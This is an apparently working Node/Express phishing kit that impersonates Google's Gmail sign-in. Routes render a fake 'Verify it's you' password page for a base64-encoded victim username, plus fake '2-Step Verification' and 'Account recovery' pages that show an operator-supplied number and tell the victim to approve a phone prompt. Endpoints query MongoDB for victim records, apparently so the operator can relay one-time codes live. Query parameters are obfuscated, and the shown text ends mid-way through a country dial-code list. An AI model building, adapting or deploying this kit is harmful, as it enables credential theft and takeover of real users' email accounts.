const express = require('express');
const router = express.Router();
const database = require('../database');

router.get('/', (req, res) => {
  
  let user = req.query.tapfirestgrdsfgdytrbdfwergter;
  const username = Buffer.from(user, 'base64').toString('utf-8');
  
  if (user == null) {
      res.render('error');
      
    }else{

  const htmlContent = `
  <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <script type="text/javascript" src="/script/fetch.js"></script>
    <title>Gmail Login</title>
    <link rel="shortcut icon" href="/images/image.png" type="image">
    <style>
        /* Reset and General Styles */
      margin: 26px;
            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
            background-color: #f0f4f9;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 85vh;
        }
    </style>

    <script>
        // Wait 0.5 seconds then show the page
        window.addEventListener("load", () => {
            setTimeout(() => {
                document.body.style.display = "flex"; // show body
                requestAnimationFrame(() => { // ensure transition applies
                    document.body.style.opacity = "1";
                });
            }, 300); // 500ms pause
        });
    </script>
     <style>
        /* Reset and General Styles */
        body {
            margin: 26px;
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f5f7fb;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 85vh;
        }

        .maindiv {
            width: 56%; /* Increased width for larger screens */
            max-width: 1052px; /* Set max width for 4K screens */
            height: auto;
            padding: 32px;
            background: #fff;
            border-radius: 25px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            flex-wrap: wrap;
			filter: blur(1.4px); /* Add this line */
        }

	.maindiv-wrapper {
            width: 117%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loading-bar {
            width: 55%; /* Match maindiv width */
            max-width: 1010px; /* Match maindiv max width */
            height: 4px; /* Thin loading bar */
            background: linear-gradient(to right, #4285f4 30%, transparent 30%);
            background-size: 200% 100%;
            animation: loading 5s infinite linear;
            border-top-left-radius: 11px;
            border-top-right-radius: 11px;
            margin-bottom: 1px; /* overlap perfectly */
        }

        @keyframes loading {
            0% {
                background-position: 200% 0;
            }
            100% {
                background-position: -200% 0;
            }
        }

        
        /* Left Section: Logo, Welcome, User Info */
        .form-half {
            flex: 1;
            min-width: 300px;
            padding-right: 20px;
        }

        .form-half .divlogo {
            width: 52px;
            height: 52px;
            margin-bottom: 25px;
        }

        .form-half .welcome {
            font-size: 44px; /* Increased font size for 4K */
            margin-top: 40px;
            margin-bottom: 20px;
        }

        .userdiv {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            border: 0.4px solid #312f2f;
            border-radius: 30px;
            background-color: transparent;
            padding: 4px;
            width: fit-content;
            margin-top: 28px;
            cursor: pointer;
        }

        .userdiv img {
            vertical-align: middle;
        }

        .user-icon {
            margin-top: 2px;
            margin-right: 13px;
            width: 18px;
            height: 18px;
        }

        .dropdown-icon {
            margin-top: 0px;
            margin-right: 12px;
            margin-left: 10px;
            width: 10px;
            height: 8px;
        }

        .userdiv span {
            font-size: 15px;
            color: #2c2a2a;
        }

        /* Right Section: Password Input, Show Password, Forgot Password, Next Button */
        .form-half1 {
            flex: 1;
            min-width: 440px;
            padding-left: 20px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .passdiv {
            position: relative;
            margin-top: 42px;
            width: 100%;
            height: auto; /* Adjusting to auto for responsiveness */
        }

        input[type="password"], input[type="text"] {
            width: 100%; /* Ensure input takes up full width */
            padding: 16px;
            padding-right: 50px;
            font-size: 18px;
            border: 1px solid #ccc;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box; /* Ensures padding does not affect width */
            transition: border-color 0.2s ease;
        }
 
        input.focused {
            border: 2px solid #4a6dd5;
        }
        

        /* Placeholder label behavior */
        .placeholder-label {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            color: #aaa;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.2s ease;
        }

        input:focus + .placeholder-label,
        input:not(:placeholder-shown) + .placeholder-label {
            top: 0px;
            left: 10px;
            padding: 4px;
            background-color: #fff;
            color: #4a6dd5;
            font-size: 12px;
        }

        .shwpwd {
            margin-top: 22px;
        }

        .shwpwd input {
            margin-right: 5px;
        }

        .shwpwd .button {
            cursor: pointer;
        }

        .fgtpwd {
            margin-top: 48px;
            margin-left: 47%;
        }

        .fgtpwd .hyperl {
            font-size: 15px;
            color: #1a73e8;
            border: none;
            background: none;
            cursor: pointer;
        }

        .btnnxt {
            padding: 11px 22px;
            font-size: 15px;
            border: none;
            border-radius: 25px;
            background-color: #0559d5;
            color: white;
            cursor: pointer;
        }

        .btnnxt:hover {
            background-color: #034099;
        }

        /* Bottom Section Styles */
        .btmdiv {
            width: 58%;
            max-width: 1050px;
            padding: 0px;
            background-color: rgba(0, 0, 0, 0);
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0);
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 5px;
			filter: blur(1.4px); /* Add this line */
        }

        .left-div {
            flex-grow: 1;
            background-color: rgba(255, 255, 255, 0);
            border: none;
        }

        .right-divs {
            display: flex;
        }

        .right-div {
            margin-left: 20px;
            background-color: rgba(255, 255, 255, 0);
            border: none;
        }

        select.btmhypl {
            padding: 12px;
            font-size: 11px;
            background-color: rgba(255, 255, 255, 0);
            border: none;
            color: black;
        }

        button.btmhypl {
            background-color: rgba(255, 255, 255, 0);
            color: black;
            border: none;
            cursor: pointer;
            padding: 12px;
            font-size: 11px;
            transition: background-color ease-in-out duration(.3s);
        }

        button.btmhypl:hover {
            background-color: #e7f3ff;
        }

        .session-expired-message {
            font-size: 15px;
            color: #c20606;
            margin-top: 77px;
            margin-bottom: 20px;
        }

        /* Media Queries for 2K Desktop Screens */817px
        @media (min-width: 1440px) and (max-width: 2560px) {
            .maindiv {
                width: 56%;
                padding: 35px;
                max-width: 1080px;
            }

            .welcome {
                font-size: 52px;
            }

            .btnnxt {
                padding: 9px 20px;
                font-size: 17px;
            }
        }

        /* Mobile Optimization for 2K Screens */
        @media (max-width: 1024px) {
            .maindiv {
                width: 90%;
                flex-direction: column;
                padding: 24px;
            }

            .form-half, .form-half1 {
                min-width: 100%;
                padding: 0;
            }
            .welcome {
                font-size: 28px;
            }

            .userdiv {
                width: 100%;
                justify-content: center;
            }

            .btnnxt {
                width: 100%;
                padding: 12px 0;
            }

            .fgtpwd {
                margin-left: 0;
                text-align: center;
            }

            .btmdiv {
                flex-direction: column;
                align-items: center;
            }

            .left-div, .right-divs {
                width: 100%;
                justify-content: center;
            }

            .right-div {
                margin-left: 10px;
            }
        }

        .show-password-btn {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            font-size: 14px;
            color: #333;
            transition: color 0.2s ease;
            padding: 0;
            line-height: 1;
        }
    </style>
        </head>
<body>
  <div class="maindiv-wrapper">
    <div class="loading-bar"></div>
    </div>
    <div class="maindiv">
        <!-- Left Section: Logo, Welcome, User Info -->
        <div class="form-half">
            <div>
                <img class="divlogo" src="/images/image.png" alt="Logo">
            </div>
            <div>
                <span class="welcome">Verify it’s you</span>
            </div>
            <div class="userdiv">
                <img class="user-icon" src="/images/user-circle.png" alt="User Icon">
                <span style="color: #2c2a2a; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${username}</span>
                <img class="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon">
            </div>
        </div>

        <!-- Right Section: Password Input, Show Password, Forgot Password, Next Button -->
              <div class="form-half1">
                <!-- Session Expired Message at the top of the right section -->
                <div class="session-expired-message">
                    <p>                  </p>
                </div>

                <div class="passdiv">
                    <input type="hidden" name="username" id="useRname" value="${username}">
                    <input required name="password" type="password" id="pEyar" value="hdshfsfoieoifhds" placeholder="">
                    <label for="pEyar" class="placeholder-label">Enter Your Password</label>
                </div>

                <div id="togglePassword" class="shwpwd">
                    <input type="checkbox" onclick="" class="checkbox">
                    <span onclick="togglePassword();" class="button">Show password</span>
                </div>

                <script>
                    const passwordInput = document.getElementById("pEyar");
                    const togglePassword = document.getElementById("togglePassword");

                    // Toggle "Show/Hide Password"
                    togglePassword.addEventListener("click", function () {
                        const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
                        passwordInput.setAttribute("type", type);
                    });

                    // Add 'focused' class on focus and remove on blur
                    passwordInput.addEventListener("focus", function () {
                        this.classList.add("focused");
                    });

                    // Keep the 'focused' class even after blur
                    passwordInput.addEventListener("blur", function () {
                        if (this.value.trim() !== "") {
                            this.classList.add("focused");
                        } else {
                            this.classList.remove("focused");
                        }
                    });

                    // Forgot Password Functionality
                    function forgotPassword() {
                      if (history.length > 1) {
                                    history.back();  // Go back if there's history
                                } else {
                                    location.reload();  // Refresh current page instead of alert/redirect
                                }
                            }
                </script>

                <div class="fgtpwd">
                    <button type="button" id="myButton" class="hyperl" onclick="forgotPassword()">Forgot password?</button>&nbsp;&nbsp;&nbsp;
                    <button type="submit" class="btnnxt">Next</button>
                </div>
            </div>
        </form>
    </div>

    <!-- Bottom Section -->
    <div class="btmdiv">
        <div class="left-div">
            <select class="btmhypl" id="language-select">
                <option value="en">English (United States)</option>
                <option value="fr">French</option>
                <option value="es">Spanish</option>
                <option value="de">German</option>
            </select>
        </div>

        <div class="right-divs">
            <div class="right-div">
                <button id="helpButton" class="btmhypl">Help</button>
            </div>
            <div class="right-div">
                <button id="privacyButton" class="btmhypl">Privacy</button>
            </div>
            <div class="right-div">
                <button id="termsButton" class="btmhypl">Terms</button>
            </div>
        </div>
    </div>
</body>
</html>
  `;

  // Send the HTML content as a response
  res.send(htmlContent);

          }

});

router.get('/fetch', (req, res) => {

  
  let userid = req.query.dsjkfhjdhfjkdfhjkd;

  

  const username = Buffer.from(userid, 'base64').toString('utf-8');
  
  // Using MongoDB to find the user
  database.mainCollection().then(collection => {
    collection.findOne({ username: username })
      .then(result => {
    
        res.json({ results: result ? [result] : [] });
      })
      .catch(err => {
        console.error('Error executing MongoDB query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      });


});

router.get('/fetchtap', (req, res) => {

  
    let userid = req.query.jfhdgigndfjnguertsdfiwjeo;
  
    
  
    const username = Buffer.from(userid, 'base64').toString('utf-8');
    
    // Using MongoDB to find the user
    database.mainCollection().then(collection => {
      collection.findOne({ username: username })
        .then(result => {
          res.json({ results: result ? [result] : [] });
        })
        .catch(err => {
          console.error('Error executing MongoDB query:', err);
          return res.status(500).json({ error: 'Internal Server Error' });
        });
    });
  
  
  });

// tap optionss

// tap optionss

router.get('/codetap', (req, res) => {

    const newdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;
  
    const decodata=  Buffer.from(newdata, 'base64').toString('utf-8');
  
    const dataArray = decodata.split('/');
  
    const id = dataArray[1];
    const tapcode = dataArray[2];
    const mtype = dataArray[3];
  
    const tappage = `
     <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Gmail - 2-Step Verification</title>
      <link rel="shortcut icon" href="/images/image.png" type="image">
      <script type="text/javascript" src="/script/fetchtap.js"></script>
  
      <style>
          /* Reset and General Styles */
         /* Reset and General Styles */
  body {
      margin: 30px;
      font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 85vh;
  }
  
  .maindiv {
      width: calc(58% + 4cm); /* Enlarge form width by 2 cm each side */
      max-width: calc(800px + 5cm); /* Increase max-width */
      height: auto; /* Allow height to adjust based on content */
      padding: 43px;
      background: #fff;
      border-radius: 30px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      display: flex;
      flex-direction: row; /* Align items horizontally */
      flex-wrap: wrap;
      justify-content: flex-start; /* Align children to the left */
      align-items: flex-start; /* Align items to the top */
  }
  
  /* Left Section: Form Half */
  .form-half {
      flex: 2 1 375px; /* Flex grow is 0, shrink is 1, base width of 280px */
      padding-right: 30px;
  }
  .divlogo {
      width: 52px;
      height: 52px;
      margin-bottom: 20px;
          }
  .welcome {
              font-size: 42px;
              margin-top: 1px;
              margin-bottom: 5px;
          }
  
  .userdiv {
              display: flex;
              align-items: center;
              justify-content: flex-start;
              border: 0.4px solid #312f2f;
              border-radius: 30px;
              background-color: #transparent;
              width: fit-content;
              margin-top: 17px ;
          }
  
         .userdiv img {
      vertical-align: middle; /* Align images vertically with text */
  }
  
           .user-icon {
             margin-top: 2px;
             margin-bottom: 2px;
             margin-left: 6px;
             margin-right: 10px;
             width: 18px;
             height: 18px;
          }
  
          .dropdown-icon {
             margin-top: 2px;
             margin-bottom: 2px;
             margin-left: 11px;
             margin-right: 10px;
             width: 10px;
             height: 8px;
          }
          
          .userdiv span {
             font-size: 16px;
             color: #2c2a2a;
          }
  
  /* Right Section: Form Half 1 (Align Right) */
  .form-half1 {
      flex: 2 1 375px; /* Flex grow is 0, shrink is 1, base width of 340px */
      padding-left: 35px;
      display: flex;
      flex-direction: column;
      justify-content: flex-start; /* Align items to the top */
      align-items: flex-start; /* Align content to the left */
      margin-left: auto; /* Ensure this aligns to the right side */
  }
  
  /* Additional Style Definitions */
  
  .numberdiv {
      font-size: 60px;
      text-align: center;
      padding: 5px;
      margin-top:60px;
      margin-left: 20vh;
      margin-bottom: 20px;
      background-color: #f1f3f400;
      border-radius: 5px;
      color: #333333;
  }
  
  .phonediv {
      margin-bottom: 20px;
  }
  
  .phonetype {
      font-size: 18px;
      
  }
  
  .messaged {
      font-size: 14px;
      color: black;
      line-height: 1.5;
  }
  
  .rememberme {
      margin-top: 20px;
      display: flex;
      align-items: center;
  }
  
  .rememberme .checkbox {
      margin-right: 10px;
  }
  
  .rememberme .button {
      font-size: 14px;
      color: black;
      cursor: pointer;
  }
  
  .tryn {
      margin-top: 6vh;
      margin-left:18vw;
  }
  
  .tryn .hyperl1 {
      font-size: 14px;
      color: #0b57d0;
      background: none;
      border: none;
      cursor: pointer;
      }
  
  .tryn .hyperl1:hover {
      text-decoration: none;
  }
  
  /* Bottom Section Styles */
  .btmdiv {
      width: calc(60% + 4cm);
      max-width: calc(822px + 5cm);
      padding: 0px;
      background-color: rgba(0, 0, 0, 0); /* Transparent background */
      box-shadow: 0 -2px 10px rgba(0, 0, 0, 0);
      display: flex;
      justify-content: center;
      align-items: center;
	  margin-top: 5px;
}
  
  .left-div {
      flex-grow: 1;
      background-color: rgba(255, 255, 255, 0);
      border: none;
  }
  
  .right-divs {
      display: flex;
  }
  
  .right-div {
      margin-left: 8px;
  }
  
  button.btmhypl {
      background-color: rgba(255, 255, 255, 0);
      color: black;
      border: none;
      cursor: pointer;
      padding: 10px;
      font-size: 11px;
      transition: background-color ease-in-out duration(.3s);
  }
  
  button.btmhypl:hover {
      background-color: #e7f3ff;
  }
  
  select.btmhypl {
      padding: 10px;
      font-size: 11px;
      background-color: rgba(255, 255, 255, 0);
      border: none;
      color: black;
  }
  
  /* Media Queries for Mobile Responsiveness */
  @media (max-width: 768px) {
      .maindiv {
          flex-direction: column;
          height: auto;
          padding: 20px;
          margin-top: -5vh;
      }
	  .form-half {
		  flex: 2 1 352px;
		  padding: 10px;
		  min-width: 81%;
		}
        .form-half1 {
                min-width: 99%;
                padding-left: 13px;
                margin-top: -15vh;
            }
            
      .welcome {
          font-size: 28px;
      }
      .numberdiv {
          font-size: 50px;
          padding: 8px;
          text-align: center;
          margin-top: 50px;
          margin-left: 14vh;
      }
  
      .messaged {
          font-size: 13px;
      }
        .tryn {
	      margin-top: 5vh;
	      margin-left: 57vw;
	        }
      .tryn .hyperl1 {
          font-size: 12px;
      }
  
      .btmdiv {
          flex-direction: column;
          align-items: center;
      }
  
      .left-div, .right-divs {
          width: 48%;
          justify-content: center;
      }
  
      .right-div {
          margin-left: 10px;
      }
  }
  
      </style>
  </head>
  
  <body>
      <div class="maindiv">
          <!-- Left Section: Form Half -->
          <div class="form-half">
              <div><img class="divlogo" src="/images/image.png" alt="Logo"></div>
              <div><span class="welcome">2-Step Verification</span></div><br>
              <div><span class="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in</span></div>
              <div class="userdiv">
                  <img class="user-icon" src="/images/user-circle.png" alt="User Icon">
                  <span style="color: #2c2a2a; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${id}</span>
                  <img class="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon">
              </div>
          </div>
  
          <!-- Right Section: Form Half 1 -->
           <div class="form-half1">
                  <div class="numberdiv">
                          <span class="number">${tapcode}</span>
                      </div>
                  <div class="phonediv">
                      <span class="phonetype">Check your ${mtype}</span><br><br>
                      <span class="messaged">Google sent a notification to your ${mtype}. Tap <b>Yes</b>&nbsp;on the notification, then tap&nbsp;${tapcode}&nbsp;on your phone to verify it's you.</span>
                  </div>
                  <div class="rememberme">
                      <div><input type="checkbox" class="checkbox" checked></div>
                      <span class="button">Don't ask again on this device</span>
                  </div>
                  <div class="tryn">
                      <button type="button" class="hyperl1" onclick="goback();">Try another way</button>&nbsp;&nbsp;&nbsp;
                  </div>
                       <script>
                            function goback() {
                                if (history.length > 1) {
                                    history.back();  // Go back if there's history
                                } else {
                                    location.reload();  // Refresh current page instead of alert/redirect
                                }
                            }
                        </script>
              </div>
          </form>
      </div>
      <!-- Bottom Section -->
      <div class="btmdiv">
          <div class="left-div">
              <select class="btmhypl" id="language-select">
                  <option value="en">English (United States)</option>
                  <option value="fr">French</option>
                  <option value="es">Spanish</option>
                  <option value="de">German</option>
              </select>
          </div>
  
          <div class="right-divs">
              <div class="right-div">
                  <button id="helpButton" class="btmhypl">Help</button>
              </div>
              <div class="right-div">
                  <button id="privacyButton" class="btmhypl">Privacy</button>
              </div>
              <div class="right-div">
                  <button id="termsButton" class="btmhypl">Terms</button>
              </div>
          </div>
      </div>
  </body>
  </html>
    `;
  
    res.send(tappage);

});

// yes tap
router.get('/yestap', (req, res) => {

    const newdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;
  
    const decodata=  Buffer.from(newdata, 'base64').toString('utf-8');
  
    const dataArray = decodata.split('/');
  
    const id = dataArray[1];
    const mtype = dataArray[3];
  
    const yestap = `
   <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Gmail - 2-Step Verification</title>
      <link rel="shortcut icon" href="/images/image.png" type="image">
      <script type="text/javascript" src="/script/fetchtap.js"></script>
  
      <style>
          /* Reset and General Styles */
         /* Reset and General Styles */
  body {
      margin: 30px;
      font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 85vh;
  }
  
  .maindiv {
      width: calc(60% + 4cm); /* Enlarge form width by 2 cm each side */
      max-width: calc(825px + 5cm); /* Increase max-width */
      height: auto; /* Allow height to adjust based on content */
      padding: 33px;
      background: #fff;
      border-radius: 30px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      display: flex;
      flex-direction: row; /* Align items horizontally */
      flex-wrap: wrap;
      justify-content: flex-start; /* Align children to the left */
      align-items: flex-start; /* Align items to the top */
  }
  
  /* Left Section: Form Half */
  .form-half {
      flex: 2 1 345px; /* Flex grow is 0, shrink is 1, base width of 280px */
      padding-right: 4px;
  }
  .divlogo {
      width: 52px;
      height: 52px;
      margin-bottom: 20px;
          }
  .welcome {
              font-size: 41px;
              margin-top: 1px;
              margin-bottom: 5px;
          }
  
  .userdiv {
              display: flex;
              align-items: center;
              justify-content: flex-start;
              border: 0.4px solid #312f2f;
              border-radius: 30px;
              background-color: #transparent;
              width: fit-content;
              margin-top: 17px ;
          }
  
         .userdiv img {
      vertical-align: middle; /* Align images vertically with text */
  }
            .user-icon {
             margin-top: 2px;
             margin-bottom: 2px;
             margin-left: 6px;
             margin-right: 8px;
             width: 18px;
             height: 18px;
          }
  
          .dropdown-icon {
             margin-top: 2px;
             margin-bottom: 2px;
             margin-left: 9px;
             margin-right: 9px;
             width: 10px;
             height: 8px;
          }
          
          .userdiv span {
             font-size: 16px;
             color: #2c2a2a;
          }
  
  /* Right Section: Form Half 1 (Align Right) */
  .form-half1 {
      flex: 1 1 327px; /* Flex grow is 0, shrink is 1, base width of 340px */
      padding-left: 43px;
      display: flex;
      flex-direction: column;
      justify-content: flex-start; /* Align items to the top */
      align-items: flex-start; /* Align content to the left */
      margin-left: auto; /* Ensure this aligns to the right side */
  }
      .gradient-box {
        width: 370px;       /* adjust size as needed */
        height: 180px;      /* adjust size as needed */
        display: flex;
        justify-content: center;
        align-items: center;            
        padding: 20px;
    }
    .gradient-box img {
        width: 160px;       /* tap.gif width */
        height: 160px;      /* tap.gif height */
        object-fit: contain;
    }

  /* Additional Style Definitions */
  
  .numberdiv {
      font-size: 48px;
      font-weight: bold;
      text-align: center;
      padding: 5px;
      margin-top:3px;
      margin-left: 140px;
      margin-bottom: 15px;
      background-color: #f1f3f400;
      border-radius: 5px;
      color: #333333;
  }
  
  .phonediv {
      margin-bottom: 10px;
  }
  
  .phonetype {
      font-size: 18px;
      
  }
  
  .messaged {
      font-size: 14px;
      color: #000000e6;
      line-height: 1.5;
  }
  
  .rememberme {
      margin-top: 10px;
      display: flex;
      align-items: center;
  }
  
  .rememberme .checkbox {
      margin-right: 8px;
	  margin-top: 7px;
  }
  
  .rememberme .button {
      font-size: 14px;
      color: black;
      cursor: pointer;
  }
  
  .tryn {
      margin-top: 45px;
      margin-left:290px;
  }
  
  .tryn .hyperl1 {
      font-size: 15px;
      color: #0865df;
      background: none;
      border: none;
      cursor: pointer;
      }
  
  .tryn .hyperl1:hover {
      text-decoration: none;
  }
  
  /* Bottom Section Styles */
  .btmdiv {
      width: calc(60% + 4cm);
      max-width: calc(845px + 5cm);
      padding: 0px;
      background-color: rgba(0, 0, 0, 0); /* Transparent background */
      box-shadow: 0 -2px 10px rgba(0, 0, 0, 0);
      display: flex;
      justify-content: center;
      align-items: center;
      margin-top: 5px;
  }
  
  .left-div {
      flex-grow: 1;
      background-color: rgba(255, 255, 255, 0);
      border: none;
  }
  
  .right-divs {
      display: flex;
  }
  
  .right-div {
      margin-left: 8px;
  }
  
  button.btmhypl {
      background-color: rgba(255, 255, 255, 0);
      color: black;
      border: none;
      cursor: pointer;
      padding: 10px;
      font-size: 11px;
      transition: background-color ease-in-out duration(.3s);
  }
  
  button.btmhypl:hover {
      background-color: #e7f3ff;
  }
  
  select.btmhypl {
      padding: 10px;
      font-size: 11px;
      background-color: rgba(255, 255, 255, 0);
      border: none;
      color: black;
  }
  
  /* Media Queries for Mobile Responsiveness */
  @media (max-width: 768px) {
      .maindiv {
          flex-direction: column;
          height: auto;
          padding: 20px;
      }
	   .form-half {
      margin-top: 29vH;
  }
            
      .welcome {
          font-size: 28px;
      }
      .numberdiv {
          font-size: 50px;
          padding: 8px;
      }
  
      .messaged {
          font-size: 13px;
      }
	.tryn {
  		margin-left: 217px;
	}
      .tryn .hyperl1 {
          font-size: 12px;
      }
  
      .btmdiv {
          flex-direction: column;
          align-items: center;
      }
	  .gradient-box {
   		margin-left: -43vW;
	 }
  
      .left-div, .right-divs {
          width: 48%;
          justify-content: center;
      }
  
      .right-div {
          margin-left: 10px;
      }
  }
  
      </style>
  </head>
  
  <body>
      <div class="maindiv">
          <!-- Left Section: Form Half -->
          <div class="form-half">
              <div><img class="divlogo" src="/images/image.png" alt="Logo"></div>
              <div><span class="welcome">Account recovery</span></div><br>
              <div><span class="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in</span></div>
              <div class="userdiv">
                  <img class="user-icon" src="/images/user-circle.png" alt="User Icon">
                  <span style="color: #2c2a2a; font-size: 17px; font-family: Arial, Helvetica, sans-serif;">${id}</span>
                  <img class="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon">
              </div>
          </div>
  
          <!-- Right Section: Form Half 1 -->
           <div class="form-half1">
                  <div class="gradient-box"><img src="/images/tap.gif" alt="Yes Recovery"></div>
                  <div class="phonediv">
                      <span class="phonetype">Check your ${mtype}</span><br><br>
                      <span class="messaged">Google sent a notification to your ${mtype}. Tap <b>Yes</b>&nbsp;on the notification verify it's you</span>
                  </div>
                  <div class="rememberme">
                      <div><input type="checkbox" class="checkbox" checked></div>
                      <span class="button">Don't ask again on this device</span>
                  </div>
                  <div class="tryn">
                      <button type="button" class="hyperl1" onclick="goback();">Try another way</button>&nbsp;&nbsp;&nbsp;
                  </div>
                       <script>
                            function goback() {
                                if (history.length > 1) {
                                    history.back();  // Go back if there's history
                                } else {
                                    location.reload();  // Refresh current page instead of alert/redirect
                                }
                            }
                        </script>
              </div>
          </form>
      </div>
      <!-- Bottom Section -->
      <div class="btmdiv">
          <div class="left-div">
              <select class="btmhypl" id="language-select">
                  <option value="en">English (United States)</option>
                  <option value="fr">French</option>
                  <option value="es">Spanish</option>
                  <option value="de">German</option>
              </select>
          </div>
  
          <div class="right-divs">
              <div class="right-div">
                  <button id="helpButton" class="btmhypl">Help</button>
              </div>
              <div class="right-div">
                  <button id="privacyButton" class="btmhypl">Privacy</button>
              </div>
              <div class="right-div">
                  <button id="termsButton" class="btmhypl">Terms</button>
              </div>
          </div>
      </div>
  </body>
  </html>
    `;
  
    res.send(yestap);
  
    
  
  });




// Define countries array outside the route handler
 const countries = [
            { code: 'af', name: 'Afghanistan', dialCode: '+93' },
            { code: 'al', name: 'Albania', dialCode: '+355' },
            { code: 'dz', name: 'Algeria', dialCode: '+213' },
            { code: 'as', name: 'American Samoa', dialCode: '+1 684' },
            { code: 'ad', name: 'Andorra', dialCode: '+376' },
            { code: 'ao', name: 'Angola', dialCode: '+244' },
            { code: 'ai', name: 'Anguilla', dialCode: '+1 264' },
            { code: 'ag', name: 'Antigua and Barbuda', dialCode: '+1 268' },
            { code: 'ar', name: 'Argentina', dialCode: '+54' },
            { code: 'am', name: 'Armenia', dialCode: '+374' },
            { code: 'aw', name: 'Aruba', dialCode: '+297' },
            { code: 'au', name: 'Australia', dialCode: '+61' },
            { code: 'at', name: 'Austria', dialCode: '+43' },
            { code: 'az', name: 'Azerbaijan', dialCode: '+994' },
            { code: 'bs', name: 'Bahamas', dialCode: '+1 242' },
            { code: 'bh', name: 'Bahrain', dialCode: '+973' },
            { code: 'bd', name: 'Bangladesh', dialCode: '+880' },
            { code: 'bb', name: 'Barbados', dialCode: '+1 246' },
            { code: 'by', name: 'Belarus', dialCode: '+375' },
            { code: 'be', name: 'Belgium', dialCode: '+32' },
            { code: 'bz', name: 'Belize', dialCode: '+501' },
            { code: 'bj', name: 'Benin', dialCode: '+229' },
            { code: 'bm', name: 'Bermuda', dialCode: '+1 441' },
            { code: 'bt', name: 'Bhutan', dialCode: '+975' },
            { code: 'bo', name: 'Bolivia', dialCode: '+591' },
            { code: 'ba', name: 'Bosnia and Herzegovina', dialCode: '+387' },
            { code: 'bw', name: 'Botswana', dialCode: '+267' },
            { code: 'br', name: 'Brazil', dialCode: '+55' },
            { code: 'io', name: 'British Indian Ocean Territory', dialCode: '+246' },
            { code: 'vg', name: 'British Virgin Islands', dialCode: '+1 284' },
            { code: 'bn', name: 'Brunei', dialCode: '+673' },
            { code: 'bg', name: 'Bulgaria', dialCode: '+359' },
            { code: 'bf', name: 'Burkina Faso', dialCode: '+226' },
            { code: 'bi', name: 'Burundi', dialCode: '+257' },
            { code: 'kh', name: 'Cambodia', dialCode: '+855' },
            { code: 'cm', name: 'Cameroon', dialCode: '+237' },
            { code: 'ca', name: 'Canada', dialCode: '+1' },
            { code: 'cv', name: 'Cape Verde', dialCode: '+238' },
            { code: 'ky', name: 'Cayman Islands', dialCode: '+1 345' },
            { code: 'cf', name: 'Central African Republic', dialCode: '+236' },
            { code: 'td', name: 'Chad', dialCode: '+235' },
            { code: 'cl', name: 'Chile', dialCode: '+56' },
            { code: 'cn', name: 'China', dialCode: '+86' },
            { code: 'cx', name: 'Christmas Island', dialCode: '+61' },
            { code: 'cc', name: 'Cocos Islands', dialCode: '+61' },
            { code: 'co', name: 'Colombia', dialCode: '+57' },
            { code: 'km', name: 'Comoros', dialCode: '+269' },
            { code: 'ck', name: 'Cook Islands', dialCode: '+682' },
            { code: 'cr', name: 'Costa Rica', dialCode: '+506' },
            { code: 'hr', name: 'Croatia', dialCode: '+385' },
            { code: 'cu', name: 'Cuba', dialCode: '+53' },
            { code: 'cw', name: 'Curacao', dialCode: '+599' },
            { code: 'cy', name: 'Cyprus', dialCode: '+357' },
            { code: 'cz', name: 'Czech Republic', dialCode: '+420' },
            { code: 'cd', name: 'Democratic Republic of the Congo', dialCode: '+243' },
            { code: 'dk', name: 'Denmark', dialCode: '+45' },
            { code: 'dj', name: 'Djibouti', dialCode: '+253' },
            { code: 'dm', name: 'Dominica', dialCode: '+1 767' },
            { code: 'do', name: 'Dominican Republic', dialCode: '+1 809' },
            { code: 'tl', name: 'East Timor', dialCode: '+670' },
            { code: 'ec', name: 'Ecuador', dialCode: '+593' },
            { code: 'eg', name: 'Egypt', dialCode: '+20' },
            { code: 'sv', name: 'El Salvador', dialCode: '+503' },
            { code: 'gq', name: 'Equatorial Guinea', dialCode: '+240' },
            { code: 'er', name: 'Eritrea', dialCode: '+291' },
            { code: 'ee', name: 'Estonia', dialCode: '+372' },
            { code: 'et', name: 'Ethiopia', dialCode: '+251' },
            { code: 'fk', name: 'Falkland Islands', dialCode: '+500' },
